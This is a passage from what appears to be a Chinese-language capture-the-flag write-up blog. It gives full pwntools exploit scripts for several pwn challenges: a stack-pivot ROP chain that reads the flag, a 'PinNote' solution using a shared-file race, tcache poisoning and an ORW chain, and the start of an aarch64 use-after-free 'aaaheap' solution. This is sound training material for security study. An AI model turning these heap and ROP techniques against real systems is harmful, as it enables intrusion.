class="params">p,a=<span class="string">&#x27;&#x27;</span></span>) :</span><br><span class="line">    <span class="keyword">if</span> a!=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        gdb.attach(p,a)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;pwn-8362e3425a.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment">#elf = ELF(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#lib = cdll.LoadLibrary(None)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#loadsym = &quot;glibc-debug --reload-symbols /home/zlsf/sysset/glibc-all-in-one/libs/2.41-6ubuntu1.1_amd64&quot;</span></span><br><span class="line"><span class="comment">#code_addr = &quot; ./glibc-2.41.tar.gz --force&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span></span><br><span class="line"><span class="comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.arch = &#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.os = &#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#elf.arch , elf.so</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">sea(<span class="string">b&quot;name?\n&quot;</span>, payload)</span><br><span class="line">reu(<span class="string">b&quot;, &quot;</span>)</span><br><span class="line">reu(<span class="string">b&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">stack = raddr64()</span><br><span class="line">ph(stack, <span class="string">&quot;stack&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x60</span> + p64(stack+<span class="number">0x70</span>) + p64(<span class="number">0x4013D4</span>)</span><br><span class="line">sea(<span class="string">b&quot;?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(stack) + p64(<span class="number">0x4013D4</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&quot;\x00&quot;</span>) </span><br><span class="line">payload+= p64(stack+<span class="number">0x10</span>) + p64(<span class="number">0x401385</span>)</span><br><span class="line">se(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x8</span></span><br><span class="line">se(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">reu(<span class="string">b&quot;, &quot;</span>)</span><br><span class="line">reu(<span class="string">b&quot;A&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">libc_base = raddr64() - <span class="number">0x29d90</span></span><br><span class="line">ph(libc_base, <span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2be51</span></span><br><span class="line">pop_rax_rdx_rbx = libc_base + <span class="number">0x904a8</span></span><br><span class="line">syscall = libc_base + <span class="number">0x91316</span></span><br><span class="line">flag_addr = stack + <span class="number">0xF0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x60</span> + p64(stack)</span><br><span class="line">payload+= <span class="string">b&quot;A&quot;</span>*<span class="number">0x10</span> + p64(pop_rdi) + p64(<span class="number">0xFFFFFFFFFFFFFF9C</span>) + p64(pop_rsi) + p64(flag_addr) </span><br><span class="line">payload+= p64(pop_rax_rdx_rbx) + p64(<span class="number">257</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall) + p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi)</span><br><span class="line">payload+= p64(flag_addr) + p64(pop_rax_rdx_rbx) + p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload+= p64(syscall) + p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(flag_addr)</span><br><span class="line">payload+= p64(pop_rax_rdx_rbx) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(syscall) + <span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">se(payload)</span><br><span class="line"></span><br><span class="line">op()</span><br></pre></td></tr></table></figure>

<p>flag：</p>
<p><img src="../images/2025-QWNT/47.png" alt="img"></p>
<h2><span id="pinnote">PinNote</span><a href="#pinnote" class="header-anchor"></a></h2><p>看了一圈没看出问题，直到测这个 tmp&#x2F;pin* 文件</p>
<p><img src="../images/2025-QWNT/48.png" alt="img"></p>
<p>如果两个进程同时指向一个文件，就可以篡改size,</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import CDLL</span></span><br><span class="line"><span class="comment">#cdl = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">s    = <span class="keyword">lambda</span>   x : io.send(x)</span><br><span class="line">sa   = <span class="keyword">lambda</span> x,y : io.sendafter(x,y)</span><br><span class="line">sl   = <span class="keyword">lambda</span>   x : io.sendline(x)</span><br><span class="line">sla  = <span class="keyword">lambda</span> x,y : io.sendlineafter(x,y)</span><br><span class="line">r    = <span class="keyword">lambda</span> x   : io.recv(x)</span><br><span class="line">ru   = <span class="keyword">lambda</span> x   : io.recvuntil(x)</span><br><span class="line">rl   = <span class="keyword">lambda</span>     : io.recvline()</span><br><span class="line">itr  = <span class="keyword">lambda</span>     : io.interactive()</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ls   = <span class="keyword">lambda</span> x   : log.success(x)</span><br><span class="line">lss  = <span class="keyword">lambda</span> x   : ls(<span class="string">&#x27;\033[1;31;40m%s -&gt; 0x%x \033[0m&#x27;</span> % (x, <span class="built_in">eval</span>(x)))</span><br><span class="line"></span><br><span class="line">attack = <span class="string">&#x27;1.1.11 123&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">binary = <span class="string">&#x27;./pin_note&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:<span class="keyword">return</span> gdb.debug(binary,gdbscript)</span><br><span class="line">    <span class="keyword">if</span> args.TAG:<span class="keyword">return</span> remote(*args.TAG.split(<span class="string">&#x27;:&#x27;</span>),ssl=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> args.REM:<span class="keyword">return</span> remote(*attack.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> process([binary] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span></span><br><span class="line">context(binary = binary, log_level = <span class="string">&#x27;debug&#x27;</span>,</span><br><span class="line">terminal=<span class="string">&#x27;tmux splitw -h -l 170&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">libc = context.binary.libc</span><br><span class="line">elf  = ELF(binary)</span><br><span class="line"><span class="comment">#print(context.binary.libs)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#import socks</span></span><br><span class="line"><span class="comment">#context.proxy = (socks.SOCKS5, &#x27;192.168.31.251&#x27;, 10808)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">brva 0x02814</span></span><br><span class="line"><span class="string">brva 0x024F9</span></span><br><span class="line"><span class="string">brva 0x02A01</span></span><br><span class="line"><span class="string">#continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"><span class="comment">#import os</span></span><br><span class="line"><span class="comment">#os.systimport os</span></span><br><span class="line"><span class="comment">#io = remote(*attack.split(&#x27;:&#x27;))</span></span><br><span class="line"><span class="comment">#io = start([])</span></span><br><span class="line"><span class="comment">#p = start([])</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn-ba8fe96c99.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">p = remote(<span class="string">&quot;pwn-ba8fe96c99.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sc_pwd</span>(<span class="params">pwd</span>):</span><br><span class="line">    ru(<span class="string">&#x27;select: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;rs): &#x27;</span>)</span><br><span class="line">    sl(pwd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">note</span>():</span><br><span class="line">    ru(<span class="string">&#x27;select: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    ru(<span class="string">&#x27;$&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;note: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,text=<span class="string">&#x27;123&#x27;</span>,y=<span class="number">1</span></span>):</span><br><span class="line">    ru(<span class="string">&#x27;$&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;edit: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;newsize: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size))</span><br><span class="line">    ru(<span class="string">&#x27;(y/n): &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> y==<span class="number">1</span>:</span><br><span class="line">        sl(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">        ru(<span class="string">&#x27;note: &#x27;</span>)</span><br><span class="line">        s(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sl(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    ru(<span class="string">&#x27;$&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;show: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">idx</span>):</span><br><span class="line">    ru(<span class="string">&#x27;$&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;del&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;delete: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">pwd = <span class="string">&#x27;M&#x27;</span></span><br><span class="line">sc_pwd(pwd)</span><br><span class="line"></span><br><span class="line">note()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = uu64(r(<span class="number">6</span>)) - <span class="number">0x21b110</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line">lss(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3f0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">rm(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">key = uu64(r(<span class="number">5</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">0xC</span></span><br><span class="line">lss(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">lss(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;select: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;rs): &#x27;</span>)</span><br><span class="line">p.sendline(pwd)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;select: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;$&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;note: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line">rm(<span class="number">5</span>)</span><br><span class="line">rm(<span class="number">4</span>)</span><br><span class="line">pay = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x108</span></span><br><span class="line">pay += p64(<span class="number">0x111</span>)</span><br><span class="line">pay += p64(key ^ (heap_base + <span class="number">0x2a0</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x200</span>,pay)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">environ = libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">pay = p64(<span class="number">0x41</span>) + p64(environ)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x100</span>,pay)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">stack = uu64(r(<span class="number">6</span>)) </span><br><span class="line">lss(<span class="string">&#x27;stack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t1 = stack - <span class="number">0x2b0</span></span><br><span class="line">pay = p64(<span class="number">0x41</span>) + p64(t1)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x100</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,gdbscript)</span></span><br><span class="line"></span><br><span class="line">libc_rop = ROP(libc)</span><br><span class="line">rax = libc_rop.find_gadget([<span class="string">&#x27;pop rax&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = libc_rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rsi = libc_rop.find_gadget([<span class="string">&#x27;pop rsi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">m = <span class="number">0</span></span><br><span class="line">rdx = libc_base + <span class="number">0x00000000000a85a9</span> <span class="comment"># pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span></span><br><span class="line">m = <span class="number">3</span></span><br><span class="line"><span class="comment">#rdx = libc_rop.find_gadget([&#x27;pop rdx&#x27;,&#x27;pop rbx&#x27;,&#x27;ret&#x27;])[0]; m = 2</span></span><br><span class="line">syscall = libc_rop.find_gadget([<span class="string">&#x27;syscall&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">orw_rop_addr = t1 <span class="comment"># ret to addr</span></span><br><span class="line">buf = orw_rop_addr + <span class="number">0xa0</span> + m*<span class="number">3</span>*<span class="number">8</span></span><br><span class="line">orw_rop  = p64(rdi) + p64(<span class="number">0x10000000000000000</span>-<span class="number">100</span>) + p64(rsi) + p64(buf) + p64(rdx) + p64(<span class="number">0</span>)*m       +     p64(rax) + p64(<span class="number">257</span>) + p64(syscall)</span><br><span class="line">orw_rop += p64(rdi) + p64(<span class="number">3</span>) + p64(rsi) + p64(buf) + p64(rdx) + p64(<span class="number">0x100</span>)*m + p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">orw_rop += p64(rdi) + p64(<span class="number">1</span>) + p64(rsi) + p64(buf) + p64(rdx) + p64(<span class="number">0x100</span>)*m + p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">orw_rop += <span class="string">b&#x27;/flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,orw_rop)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ru(&#x27;select: &#x27;)</span></span><br><span class="line"><span class="comment">#sl(&#x27;1&#x27;)</span></span><br><span class="line"><span class="comment">#ru(&#x27;rs): &#x27;)</span></span><br><span class="line"><span class="comment">#sl(pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(0,0xFFF00000078,&#x27;hack&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#ru(b&#x27;select: &#x27;)</span></span><br><span class="line"><span class="comment">#sl(&#x27;1&#x27;)</span></span><br><span class="line"><span class="comment">#ru(b&#x27;Please enter old password for verification: &#x27;)</span></span><br><span class="line"><span class="comment">#sl(pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x10FFFFFF8)</span></span><br><span class="line"><span class="comment">#edit(4,0x2FFFFFFFF,&#x27;hah&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rm(0)</span></span><br><span class="line"><span class="comment">#add(0x7fffffff)</span></span><br><span class="line"><span class="comment">#edit(0,0xffffffff,y=0)</span></span><br><span class="line"><span class="comment">#rm(1)</span></span><br><span class="line"><span class="comment">#dit(1,0x58,b&#x27;B&#x27;*0x58)</span></span><br><span class="line"><span class="comment">#pay = flat(&#123;</span></span><br><span class="line"><span class="comment">#&#125;,filler=b&#x27;\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc.address = libc_base</span></span><br><span class="line"><span class="comment"># system = libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># bin_sh = next(libc.search(b&#x27;/bin/sh&#x27;))</span></span><br><span class="line">itr()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="aaaheap">aaaheap</span><a href="#aaaheap" class="header-anchor"></a></h2><p>ARM aarch64 架构下的一个 glibc 堆体题目，UAF 漏洞， heap list 也在 heap 上,UAF 构造任意地址申请到heaplist后既可以任意地址读写，后面把 shellcode写到 heap上 然后修改 stack 上的返回地址， ret2shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import CDLL</span></span><br><span class="line"><span class="comment">#cdl = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">s    = <span class="keyword">lambda</span>   x : io.send(x)</span><br><span class="line">sa   = <span class="keyword">lambda</span> x,y : io.sendafter(x,y)</span><br><span class="line">sl   = <span class="keyword">lambda</span>   x : io.sendline(x)</span><br><span class="line">sla  = <span class="keyword">lambda</span> x,y : io.sendlineafter(x,y)</span><br><span class="line">r    = <span class="keyword">lambda</span> x   : io.recv(x)</span><br><span class="line">ru   = <span class="keyword">lambda</span> x   : io.recvuntil(x)</span><br><span class="line">rl   = <span class="keyword">lambda</span>     : io.recvline()</span><br><span class="line">itr  = <span class="keyword">lambda</span>     : io.interactive()</span><br><span class="line">uu32 = <span 